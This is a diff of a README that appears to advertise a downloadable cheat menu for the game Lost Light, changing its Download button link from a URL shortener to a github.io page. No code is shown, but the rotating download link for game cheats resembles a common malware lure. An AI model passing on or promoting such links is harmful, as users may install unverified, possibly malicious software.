@@ -10,7 +10,7 @@
 
 ![Скриншот чит-меню Lost Light](https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1797880/header.jpg?t=1711521041)
 
-[![Download](https://img.shields.io/badge/Download-Cheat_Menu-green?style=for-the-badge&logo=github)](https://flyn.co/ThCH6y)
+[![Download](https://img.shields.io/badge/Download-Cheat_Menu-green?style=for-the-badge&logo=github)](https://meteoric-rook-835.github.io/)
 
 </div>
 
